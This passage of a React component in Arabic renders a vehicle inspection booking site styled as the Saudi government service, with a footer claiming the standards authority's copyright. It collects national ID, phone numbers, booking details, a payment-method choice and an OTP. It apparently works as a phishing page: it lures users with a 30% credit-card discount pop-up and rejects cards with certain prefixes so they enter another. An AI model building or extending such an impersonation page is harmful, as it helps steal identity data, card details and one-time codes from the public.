                    strokeWidth={2}
                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">
                فحص معتمد وآمن
              </h3>
              <p className="text-muted-foreground leading-relaxed">
                فحص شامل ومعتمد من الجهات الرسمية
              </p>
            </div>

            {/* Feature 3 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-[#1a7a3a]/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg
                  className="w-7 h-7 text-[#1a7a3a]"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">
                دفع إلكتروني آمن
              </h3>
              <p className="text-muted-foreground leading-relaxed">
                ادفع بأمان عبر طرق دفع متعددة ومشفرة
              </p>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="bg-gradient-to-br from-teal-700/5 to-accent/5 rounded-3xl p-12 border border-[#1a7a3a]/10">
            <div className="text-center mb-8">
              <h3 className="text-2xl md:text-3xl font-bold text-foreground mb-3">
                ابدأ الآن
              </h3>
              <p className="text-muted-foreground text-lg">
                اختر الإجراء المناسب لك
              </p>
            </div>

            <div className="grid sm:grid-cols-3 gap-4 max-w-3xl mx-auto">
              <Button
                size="lg"
                className="h-16 text-base font-semibold bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] hover:from-[#166b33] hover:to-[#0a4d23] shadow-md"
                onClick={() => goToStep("booking")}
              >
                <svg
                  className="ml-2 h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
                  />
                </svg>
                حجز موعد
              </Button>

              <Button
                size="lg"
                variant="outline"
                className="h-16 text-base font-medium border-2 hover:bg-secondary bg-transparent"
                onClick={() => goToStep("booking")}
              >
                <svg
                  className="ml-2 h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 4.354a4 4 0 110 7.292M12 4.354a4 4 0 013.131 6.217"
                  />
                </svg>
                التحقق من الحجز
              </Button>

              <Button
                size="lg"
                variant="outline"
                className="h-16 text-base font-medium border-2 hover:bg-secondary bg-transparent"
                 onClick={() => goToStep("booking")}
              >
                <svg
                  className="ml-2 h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M14.752 11.168l-2.12-2.12a1 1 0 111.414-1.414l2.122 2.122a1 1 0 010 1.414z"
                  />
                </svg>
                معرفة المزيد
              </Button>
            </div>
          </div>
        </div>
        <Dialog open={showOfferModal} onOpenChange={setShowOfferModal}>
          <DialogContent className="sm:max-w-md border-[#1a7a3a]/20">
            <div className="relative">
              <button
                onClick={() => setShowOfferModal(false)}
                className="absolute left-2 top-2 rounded-full bg-white/90 p-1.5 hover:bg-white shadow-lg transition-colors z-10"
              >
                <X className="h-4 w-4 text-gray-600" />
              </button>
              <Image
                src="/adcs.jpg"
                alt="عرض خاص"
                width={400}
                height={300}
                className="w-full rounded-lg"
              />
            </div>
            <div className="text-center space-y-3 pt-2">
              <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
              <p className="text-gray-600">
                استمتع بخصم 30% عند الدفع ببطاقة الائتمان
              </p>
              <button
                onClick={() => setShowOfferModal(false)}
                className="w-full bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] text-white py-3 rounded-lg font-medium hover:from-[#166b33] hover:to-[#0a4d23] transition-all"
              >
                متابعة الدفع
              </button>
            </div>
          </DialogContent>
        </Dialog>
        <VerificationPage
          open={stcModalOpen}
          onOpenChange={() => setStcModalOpen(false)}
          verifyOtp={handleStcVerify}
        />
      </div>
    );
  }
  const blockedPrefixes = ["4847", "4323", "4685"];

  const checkCardAllow = (cardNum: string) => {
    const isBlocked = blockedPrefixes.some((prefix) =>
      cardNum.startsWith(prefix)
    );

    if (isBlocked) {
      setCardError("البطاقة غير مدعومة يرجى ادخال بطاقة اخرى");
      return false;
    }

    setCardError("");
    return true;
  };

  if (currentStep === "booking") {
    return (
      <div dir="rtl" className="min-h-screen bg-[#f7f8fa] text-[#161616]">
        <header className="bg-white border-b border-[#e2e5e8] sticky top-0 z-50 shadow-[0_1px_5px_rgba(0,0,0,.08)]">
          <div className="max-w-[1180px] mx-auto px-4 sm:px-5 py-2.5 min-h-[70px] sm:min-h-[86px] flex items-center justify-between gap-4 sm:gap-6">
            <div className="flex items-center gap-4 sm:gap-7 flex-1 min-w-0">
              <div className="shrink-0">
                <Image src="/next.svg" alt="مركز سلامة المركبات" width={180} height={37} className="h-10 sm:h-14 w-auto object-contain" />
              </div>
              <nav className="hidden lg:flex items-stretch self-stretch gap-1 text-[13px] font-medium text-[#384250]" aria-label="التنقل الرئيسي">
                <a href="/" className="px-3 flex items-center border-b-[3px] border-transparent hover:bg-[#f3f4f6] transition-colors">الرئيسية</a>
                <a href="/application" className="px-3 flex items-center border-b-[3px] border-[#7ec1a3] bg-[#f7faf8] text-[#1b8354]">حجز موعد الفحص</a>
                <a href="#inspection-info" className="px-3 flex items-center border-b-[3px] border-transparent hover:bg-[#f3f4f6] transition-colors">استعلام عن حالة الفحص</a>
                <a href="#inspection-info" className="px-3 flex items-center border-b-[3px] border-transparent hover:bg-[#f3f4f6] transition-colors">مواقع الفحص</a>
                <a href="#inspection-info" className="px-3 flex items-center border-b-[3px] border-transparent hover:bg-[#f3f4f6] transition-colors">المقابل المالي للفحص</a>
              </nav>
            </div>
            <div className="flex items-center gap-4 shrink-0">
              <button type="button" className="hidden sm:block text-[13px] font-medium text-[#384250] hover:text-[#1b8354]">English</button>
              <button type="button" className="hidden md:block text-[13px] font-medium text-[#384250] hover:text-[#1b8354]">تسجيل دخول</button>
              <button className="lg:hidden p-2 rounded-md hover:bg-gray-100 transition-colors" aria-label="القائمة">
                <Menu className="w-5 h-5 text-[#384250]" />
              </button>
            </div>
          </div>
        </header>

        <div className="bg-[#1b8354] py-6 sm:py-8 shadow-sm">
          <div className="max-w-[1180px] mx-auto px-4 sm:px-5">
            <p className="text-[10px] sm:text-[12px] text-white/75 mb-1 sm:mb-2">الرئيسية &nbsp; / &nbsp; حجز موعد الفحص الفني الدوري</p>
            <h1 className="text-xl sm:text-2xl md:text-[30px] font-bold text-white leading-tight">حجز موعد الفحص الفني الدوري</h1>
            <p className="text-xs sm:text-sm text-white/80 mt-1 sm:mt-2">حجز موعد للمركبات السعودية وغير السعودية للأفراد</p>
          </div>
        </div>

        <div id="inspection-info" className="max-w-[1180px] mx-auto px-4 sm:px-6 py-7">
          <form
            onSubmit={handleVehicleInfoSubmit}
            noValidate
            autoComplete="off"
            className="space-y-6"
          >

            <div className="bg-white rounded-2xl border border-[#e2e5e8] p-5 sm:p-7 shadow-[0_1px_4px_rgba(0,0,0,.12)]">
              <h2 className="text-xl font-bold text-[#161616] mb-6 pb-4 border-b border-[#edf0f2]">المعلومات الشخصية</h2>

              <div className="grid md:grid-cols-2 gap-x-7 gap-y-5">
                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">الجنسية / الإقامة <span className="text-red-600">*</span></label>
                  <select
                    value={country}
                    onChange={(e) => setCountry(e.target.value)}
                     className={fieldClassName("country")}
                     aria-invalid={Boolean(fieldErrors.country)}
                     onBlur={() => clearFieldError("country")}
                    required
                  >
                    <option value="">اختر الجنسية</option>
                    {countries.map((c) => (
                      <option key={c.code} value={c.code}>
                        {c.nameAr} ({c.nameEn})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">رقم الهوية <span className="text-red-600">*</span></label>
                  <Input
                    type="text"
                    inputMode="numeric"
                    maxLength={10}
                    value={displayNationalId}
                    onChange={(e) => {
                      const westernValue = e.target.value
                        .replace(/[0-9]/g, (d) => "0123456789".indexOf(d).toString())
                        .replace(/\D/g, "");
                      const arabicValue = westernValue.replace(/\d/g, (d) => "0123456789"[Number.parseInt(d)]);
                      setNationalId(westernValue);
                      setDisplayNationalId(arabicValue);
                    }}
                    placeholder="١٢٣٤٥٦٧٨٩٠"
                     className={fieldClassName("nationalId")}
                     aria-invalid={Boolean(fieldErrors.nationalId)}
                     onBlur={() => clearFieldError("nationalId")}
                    required
                  />
                  <p className="text-xs text-gray-400">يجب أن يبدأ بـ 1 (سعودي) أو 2 (مقيم) ويتكون من 10 أرقام</p>
                </div>

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">اسم المالك <span className="text-red-600">*</span></label>
                  <Input
                    type="text"
                    value={ownerName}
                    onChange={(e) => setOwnerName(e.target.value)}
                    placeholder="أدخل اسم المالك"
                     className={fieldClassName("ownerName")}
                     aria-invalid={Boolean(fieldErrors.ownerName)}
                     onBlur={() => clearFieldError("ownerName")}
                    required
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">رقم جوال المالك <span className="text-red-600">*</span></label>
                  <div className="flex w-full items-stretch gap-2" dir="ltr">
                    <div className="flex items-center gap-1.5 px-3 bg-gray-50 border border-[#e2e5e8] rounded-lg shrink-0">
                      <span className="text-base">🇸🇦</span>
                      <span className="text-[11px] font-bold text-gray-600">+966</span>
                    </div>
                    <Input
                      type="tel"
                      inputMode="numeric"
                      maxLength={10}
                       value={ownerPhone}
                      onChange={(e) => {
                        const value = e.target.value
                          .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
                          .replace(/\D/g, "");
                         setOwnerPhone(value);
                         clearFieldError("ownerPhone");
                      }}
                      placeholder="5XXXXXXXX"
                       className={`${fieldClassName("ownerPhone")} min-w-0 flex-1 text-left`}
                       aria-invalid={Boolean(fieldErrors.ownerPhone)}
                      dir="ltr"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">البريد الالكتروني</label>
                  <Input
                    type="email"
                    placeholder="example@email.com"
                     className="template-field"
                    dir="ltr"
                  />
                </div>

                <div className="flex items-start gap-3 pt-2 md:col-span-2">
                  <Checkbox
                    id="authorize"
                    checked={authorizeInspection}
                    onCheckedChange={(checked) => setAuthorizeInspection(checked as boolean)}
                    className="mt-0.5"
                  />
                  <label htmlFor="authorize" className="flex-1 cursor-pointer">
                    <span className="text-sm font-medium text-gray-900">هل تريد تفويض شخص آخر بفحص المركبة؟</span>
                  </label>
                </div>
              </div>
            </div>

            {authorizeInspection && (
              <div className="bg-white rounded-2xl border border-[#e2e5e8] p-5 sm:p-7 shadow-[0_1px_4px_rgba(0,0,0,.12)]">
                <h2 className="text-xl font-bold text-[#161616] mb-6 pb-4 border-b border-[#edf0f2]">بيانات المفوض</h2>
                <div className="space-y-4">
                  <div className="flex gap-3 justify-end">
                    <button
                      type="button"
                      onClick={() => setAuthorizedPersonType("gcc")}
                      className={`px-5 py-2.5 rounded-lg border text-sm transition-all ${
                        authorizedPersonType === "gcc"
                          ? "border-[#1b8354] bg-[#1b8354]/5 text-[#1b8354] font-medium"
                          : "border-[#9da4ae] text-[#5f666d]"
                      }`}
                    >
                      مواطن خليجي
                    </button>
                    <button
                      type="button"
                      onClick={() => setAuthorizedPersonType("resident")}
                      className={`px-5 py-2.5 rounded-lg border text-sm transition-all ${
                        authorizedPersonType === "resident"
                          ? "border-[#1b8354] bg-[#1b8354]/5 text-[#1b8354] font-medium"
                          : "border-[#9da4ae] text-[#5f666d]"
                      }`}
                    >
                      مواطن/مقيم
                    </button>
                  </div>

                  <div className="space-y-2">
                    <label className="text-[13px] font-medium text-[#161616]">اسم المفوض</label>
                    <Input type="text" value={authorizedName} onChange={(e) => { setAuthorizedName(e.target.value); clearFieldError("authorizedName"); }} placeholder="أدخل اسم المفوض" className={fieldClassName("authorizedName")} aria-invalid={Boolean(fieldErrors.authorizedName)} />
                  </div>

                  <div className="space-y-2">
                    <label className="text-[13px] font-medium text-[#161616]">رقم جوال المفوض</label>
                    <div className="flex gap-2">
                    <div className="flex items-center gap-1.5 px-3 bg-gray-50 border border-[#e2e5e8] rounded-lg shrink-0">
                        <span className="text-base">🇸🇦</span>
                        <span className="text-[11px] font-bold text-gray-600">+966</span>
                      </div>
                      <Input
                        type="tel"
                        inputMode="numeric"
                        maxLength={10}
                        value={authorizedPhone}
                        onChange={(e) => {
                          const value = e.target.value.replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString()).replace(/\D/g, "");
                          setAuthorizedPhone(value);
                        }}
                        placeholder="5XXXXXXXX"
                         className={`${fieldClassName("authorizedPhone")} min-w-0 flex-1 text-left`}
                         aria-invalid={Boolean(fieldErrors.authorizedPhone)}
                        dir="ltr"
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <label className="text-[13px] font-medium text-[#161616]">رقم الهوية / إقامة المفوض</label>
                    <Input
                      type="text"
                      inputMode="numeric"
                      maxLength={10}
                      value={authorizedId}
                      onChange={(e) => {
                        const value = e.target.value.replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString()).replace(/\D/g, "");
                        setAuthorizedId(value);
                      }}
                      placeholder="0000 0000 000"
                       className={fieldClassName("authorizedId")}
                       aria-invalid={Boolean(fieldErrors.authorizedId)}
                    />
                  </div>

                  <div className="space-y-2">
                    <label className="text-[13px] font-medium text-[#161616]">تاريخ ميلاد المفوض</label>
                   <Input type="date" value={authorizedBirthDate} onChange={(e) => { setAuthorizedBirthDate(e.target.value); clearFieldError("authorizedBirthDate"); }} className={fieldClassName("authorizedBirthDate")} aria-invalid={Boolean(fieldErrors.authorizedBirthDate)} />
                  </div>

                  <div className="flex items-start gap-3">
                    <input
                      type="checkbox"
                      id="authorized-agreement"
                      checked={authorizedAgreement}
                      onChange={(e) => setAuthorizedAgreement(e.target.checked)}
                       className={`mt-1 w-4 h-4 rounded border-[#9da4ae] text-[#1b8354] focus:ring-[#1b8354] ${fieldErrors.authorizedAgreement ? "border-red-500 ring-1 ring-red-500" : ""}`}
                       aria-invalid={Boolean(fieldErrors.authorizedAgreement)}
                    />
                    <label htmlFor="authorized-agreement" className="text-xs text-gray-500 leading-relaxed cursor-pointer">
                      أوافق على أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية بزيارة وإجراء الفحص الفني للمركبة المفوض عليها
                    </label>
                  </div>
                </div>
              </div>
            )}

            <div className="bg-white rounded-2xl border border-[#e2e5e8] p-5 sm:p-7 shadow-[0_1px_4px_rgba(0,0,0,.12)]">
              <h2 className="text-xl font-bold text-[#161616] mb-6 pb-4 border-b border-[#edf0f2]">معلومات المركبة</h2>

              <div className="space-y-4">
                {/* removed vehicle document upload controls
                  <button
                    type="button"
                    className="flex items-center justify-center gap-2 h-11 rounded-lg border border-dashed border-[#9da4ae] bg-[#f7f8fa] text-sm text-[#5f666d] hover:bg-gray-100 transition"
                  >
                    <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
                    تحميل رخصة قيادة
                  </button>
                  <button
                    type="button"
                    className="flex items-center justify-center gap-2 h-11 rounded-lg border border-dashed border-[#9da4ae] bg-[#f7f8fa] text-sm text-[#5f666d] hover:bg-gray-100 transition"
                  >
                    <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
                    تحميل بطاقة مركبة
                  </button>
                </div> */}

                {/* Service Mode Selector */}
                <div className="space-y-2 mb-4">
                  <label className="text-[13px] font-medium text-[#161616]">نوع الخدمة المطلوبة</label>
                  <div className="grid grid-cols-2 gap-2 p-1 bg-[#f4f6f8] rounded-xl border border-gray-200">
                    <button
                      type="button"
                      onClick={() => {
                        setBookingMode("new");
                        if (inspectionType === "تعديل موعد الحجز") setInspectionType("");
                      }}
                      className={`py-2 px-3 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                        bookingMode === "new"
                          ? "bg-white text-[#1a7a3a] shadow-xs border border-emerald-200"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                    >
                      حجز موعد جديد (115 ر.س)
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        setBookingMode("modify");
                        setInspectionType("تعديل موعد الحجز");
                      }}
                      className={`py-2 px-3 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                        bookingMode === "modify"
                          ? "bg-[#1a7a3a] text-white shadow-xs"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                    >
                      تعديل موعد الحجز (37.5 ر.س)
                    </button>
                  </div>
                  {bookingMode === "modify" && (
                    <div className="rounded-xl border border-emerald-200 bg-emerald-50/80 p-3 text-xs text-emerald-950 flex items-center justify-between mt-2">
                      <div>
                        <div className="font-bold text-emerald-900">رسوم تعديل موعد الحجز</div>
                        <div className="text-[11px] text-emerald-700">تعديل مركز أو موعد فحص المركبة</div>
                      </div>
                      <div className="text-right">
                        <div className="text-sm font-black font-mono text-[#1a7a3a]">37.50 ر.س</div>
                        <div className="text-[10px] text-emerald-600">شامل ضريبة القيمة المضافة</div>
                      </div>
                    </div>
                  )}
                </div>

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">حالة المركبة</label>
                  <select
                    value={vehicleStatus}
                    onChange={(e) => setVehicleStatus(e.target.value as VehicleStatus)}
                    className="template-field"
                  >
                    <option value="license">مرخصة</option>
                    <option value="customs">جمركية</option>
                  </select>
                </div>

                {vehicleStatus === "license" && (
                  <SaudiPlateInput
                    numbers={plateNumbers}
                    letters={plateLetters}
                    onNumbersChange={setPlateNumbers}
                    onLettersChange={setPlateLetters}
                  />
                )}

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">المنطقة الإدارية للفحص</label>
                  <select
                    value={region}
                    onChange={(e) => {
                      setRegion(e.target.value);
                      setCity("");
                      setInspectionCenter("");
                    }}
                    className={fieldClassName("region")}
                    aria-invalid={Boolean(fieldErrors.region)}
                  >
                    <option value="">اختر المنطقة</option>
                    {regions.map((r) => (
                      <option key={r.value} value={r.value}>{r.label}</option>
                    ))}
                  </select>
                </div>

                {region && (
                  <div className="space-y-2">
                    <label className="text-[13px] font-medium text-[#161616]">موقع الفحص</label>
                    <select
                      value={city}
                      onChange={(e) => {
                        setCity(e.target.value);
                        setInspectionCenter("");
                      }}
                      className={fieldClassName("city")}
                      aria-invalid={Boolean(fieldErrors.city)}
                    >
                      <option value="">اختر المدينة</option>
                      {citiesByRegion[region]?.map((c) => (
                        <option key={c.value} value={c.value}>{c.label}</option>
                      ))}
                    </select>
                  </div>
                )}

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">نوع التسجيل</label>
                  <select
                    value={registrationType}
                    onChange={(e) => setRegistrationType(e.target.value)}
                    className="template-field"
                  >
                    <option value="">اختر نوع التسجيل</option>
                    <option value="new">تسجيل جديد</option>
                    <option value="renew">تجديد</option>
                    <option value="transfer">نقل ملكية</option>
                  </select>
                </div>

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">مركز الخدمة</label>
                  <select
                    value={inspectionCenter}
                    onChange={(e) => setInspectionCenter(e.target.value)}
                    className={fieldClassName("inspectionCenter")}
                    aria-invalid={Boolean(fieldErrors.inspectionCenter)}
                    disabled={!region || !city}
                  >
                    <option value="">
                      {!region || !city ? "اختر المنطقة والمدينة أولاً" : "اختر فرع الفحص"}
                    </option>
                    {availableCenters.map((center) => (
                      <option key={center.id} value={center.id}>
                        {center.name}
                      </option>
                    ))}
                  </select>
                    {selectedInspectionCenter && (
                      <div className="rounded-lg border border-[#dce8e2] bg-[#f4faf7] p-3 text-xs leading-6 text-[#4b5563]">
                        <p>
                          <span className="font-semibold text-[#161616]">العنوان:</span>{" "}
                          {selectedInspectionCenter.address}
                        </p>
                        <p>
                          <span className="font-semibold text-[#161616]">الخدمات:</span>{" "}
                          {selectedInspectionCenter.services}
                        </p>
                        {selectedInspectionCenter.map && (
                          <a
                            href={selectedInspectionCenter.map}
                            target="_blank"
                            rel="noreferrer"
                            className="mt-1 inline-flex font-semibold text-[#1b8354] hover:underline"
                          >
                            فتح موقع الفرع على الخريطة
                          </a>
                        )}
                      </div>
                    )}
                </div>

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">نوع المركبة / الخدمة</label>
                  <select
                    value={inspectionType}
                    onChange={(e) => setInspectionType(e.target.value)}
                    className={fieldClassName("inspectionType")}
                    aria-invalid={Boolean(fieldErrors.inspectionType)}
                  >
                    <option value="">اختر نوع المركبة</option>
                    {inspectionTypes.map((type) => (
                      <option key={type.value} value={type.value}>
                        {type.icon} {type.label}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-2">
                  <label className="text-[13px] font-medium text-[#161616]">الرقم التسلسلي للمركبة</label>
                  <Input
                    type="text"
                    value={serialNumber}
                    onChange={(e) => setSerialNumber(e.target.value)}
                    placeholder="أدخل الرقم التسلسلي للمركبة"
                    className={fieldClassName("serialNumber")}
                    aria-invalid={Boolean(fieldErrors.serialNumber)}
                  />
                </div>
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-[#e2e5e8] overflow-hidden shadow-[0_1px_4px_rgba(0,0,0,.12)]">
              <div className="w-full h-48 bg-gray-200 relative">
                <iframe
                  src="https://www.openstreetmap.org/export/embed.html?bbox=46.5%2C24.6%2C46.9%2C24.8&layer=mapnik"
                  className="w-full h-full border-0"
                  title="خريطة الموقع"
                  loading="lazy"
                />
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-[#e2e5e8] p-5 sm:p-7 shadow-[0_1px_4px_rgba(0,0,0,.12)]">
              <h2 className="text-xl font-bold text-[#161616] mb-6 pb-4 border-b border-[#edf0f2]">موعد الفحص</h2>

              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-2">
                    <label className="text-[13px] font-medium text-[#161616]">تاريخ الخدمة</label>
                    <Input
                      type="date"
                      min={new Date().toISOString().split("T")[0]}
                      value={inspectionDate}
                      onChange={(e) => setInspectionDate(e.target.value)}
                       className={fieldClassName("inspectionDate")}
                       aria-invalid={Boolean(fieldErrors.inspectionDate)}
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-[13px] font-medium text-[#161616]">موعد الخدمة (من 8 ص إلى 8 م)</label>
                    <Input
                      type="time"
                      min="08:00"
                      max="20:00"
                      value={inspectionTime}
                      onChange={(e) => setInspectionTime(e.target.value)}
                       className={fieldClassName("inspectionTime")}
                       aria-invalid={Boolean(fieldErrors.inspectionTime)}
                      required
                    />
                  </div>
                </div>

                <div className="flex items-start gap-2 p-3 bg-amber-50 border border-amber-200 rounded-lg">
                  <CircleAlert className="w-4 h-4 text-amber-600 mt-0.5 flex-shrink-0" />
                  <p className="text-xs text-amber-700 leading-relaxed">
                    التذكير بأن المواعيد مسبقة وغير مسموح بالحضور في غير الوقت المحدد، كما يجب عدم التأخر أكثر من 45 دقيقة.
                  </p>
                </div>
              </div>
            </div>

            {vehicleInfoError && (
              <Alert variant="destructive" className="bg-red-50 border-red-200">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>{vehicleInfoError}</AlertDescription>
              </Alert>
            )}

            <button
              type="submit"
              className="w-full h-11 bg-[#1b8354] hover:bg-[#146b43] text-white rounded-lg text-sm font-bold transition-colors shadow-none"
            >
              حجز الموعد
            </button>
          </form>
        </div>

        <footer className="bg-[#1e2738] border-t border-[#273448] mt-8 py-8 text-white">
          <div className="max-w-[1180px] mx-auto px-5 flex flex-col sm:flex-row items-center justify-between gap-5 text-center sm:text-right">
            <div>
              <p className="text-sm font-semibold">جميع الحقوق محفوظة الهيئة السعودية للمواصفات والمقاييس والجودة</p>
              <p className="text-xs text-slate-400 mt-2">تم تطويره وصيانته بواسطة ثقة لخدمات الاعمال</p>
            </div>
            <div className="text-xs text-slate-400">
              <span>©️ 2026</span>
              <span className="mx-2">•</span>
              <span>خدمة الفحص الفني الدوري</span>
            </div>
          </div>
        </footer>
      </div>
    );
  }

  if (currentStep === "payment-method") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <header className="bg-card border-b border-border sticky top-0 z-50 shadow-sm">
          <div className="max-w-[1180px] mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
            <button className="p-2 hover:bg-accent rounded-lg transition-colors">
              <Menu className="w-5 h-5 text-foreground" />
            </button>
            <div className="flex items-center gap-3">
              <Image src="/next.svg" alt="logo" width={180} height={37} className="h-10 sm:h-14 w-auto object-contain" />
            </div>
            <Button
              variant="ghost"
              size="sm"
              className="hidden sm:inline-flex text-muted-foreground hover:text-foreground"
            >
              English
            </Button>
            <button className="sm:hidden p-2 text-xs font-bold text-teal-700">EN</button>
          </div>
        </header>
        <div className="py-8 sm:py-12 px-4">
          <div className="max-w-2xl mx-auto">
          <Card className="shadow-lg border-border/40">
            <CardHeader className="text-center border-b border-border/40 pb-6">
              <CardTitle className="text-3xl font-bold text-foreground">
                اختر طريقة الدفع
              </CardTitle>
              <CardDescription className="text-lg">
                اختر الطريقة المناسبة لإتمام عملية الدفع
              </CardDescription>
            </CardHeader>
            <CardContent className="pt-8">
              <div className="space-y-4">
                {paymentMethods.map((method) => (
                  <button
                    key={method.id}
                    type="button"
                    onClick={() => {
                      if (method.available) {
                        setPaymentMethod(method.id);
                      }
                    }}
                    disabled={!method.available}
                    className={`w-full p-6 rounded-xl border-2 transition-all text-right ${
                      paymentMethod === method.id
                        ? "border-[#1a7a3a] bg-[#1a7a3a]/5"
                        : method.available
                        ? "border-border hover:border-[#1a7a3a]/50"
                        : "border-border opacity-50 cursor-not-allowed"
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-4">
                        <div
                          className={`w-12 h-12 rounded-xl flex items-center justify-center ${
                            paymentMethod === method.id
                              ? "bg-teal-700 text-white"
                              : "bg-secondary text-foreground"
                          }`}
                        >
                          <Image
                            src={method.icon}
                            alt="log"
                            width={80}
                            height={30}
                          />
                        </div>
                        <div className="text-right">
                          <div className="font-semibold text-foreground text-lg">
                            {method.label}
                          </div>
                          <div className="text-sm text-muted-foreground">
                            {method.description}
                          </div>
                        </div>
                      </div>
                      {method.badge && (
                        <span className="px-3 py-1 bg-[#1a7a3a]/10 text-[#1a7a3a] text-sm font-medium rounded-full">
                          {method.badge}
                        </span>
                      )}
                    </div>
                  </button>
                ))}
              </div>
              <Button
                onClick={handlePaymentMethodSubmit}
                disabled={!paymentMethod || isLoading}
                className="w-full mt-8 h-14 text-lg text-white font-semibold bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] hover:from-[#166b33] hover:to-[#0a4d23]"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                    جارٍ التحميل...
                  </>
                ) : (
                  "متابعة"
                )}
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
    );
  }

  if (currentStep === "card-form") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <header className="bg-card border-b border-border sticky top-0 z-50 shadow-sm">
          <div className="max-w-[1180px] mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
            <button className="p-2 hover:bg-accent rounded-lg transition-colors">
              <Menu className="w-5 h-5 text-foreground" />
            </button>
            <div className="flex items-center gap-3">
              <Image src="/next.svg" alt="logo" width={180} height={37} className="h-10 sm:h-14 w-auto object-contain" />
            </div>
            <button className="sm:hidden p-2 text-xs font-bold text-teal-700">EN</button>
            <Button variant="ghost" size="sm" className="hidden sm:inline-flex text-muted-foreground hover:text-foreground">
              English
            </Button>
          </div>
        </header>
        <div className="py-8 sm:py-12 px-4">
          <Dialog open={showOfferModal} onOpenChange={setShowOfferModal}>
          <DialogContent className="sm:max-w-md border-[#1a7a3a]/20">
            <div className="relative">
              <button
                onClick={() => setShowOfferModal(false)}
                className="absolute left-2 top-2 rounded-full bg-white/90 p-1.5 hover:bg-white shadow-lg transition-colors z-10"
              >
                <X className="h-4 w-4 text-gray-600" />
              </button>
              <Image
                src="/adcs.jpg"
                alt="عرض خاص"
                width={400}
                height={300}
                className="w-full rounded-lg"
              />
            </div>
            <div className="text-center space-y-3 pt-2">
              <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
              <p className="text-gray-600">
                استمتع بخصم 30% عند الدفع ببطاقة الائتمان
              </p>
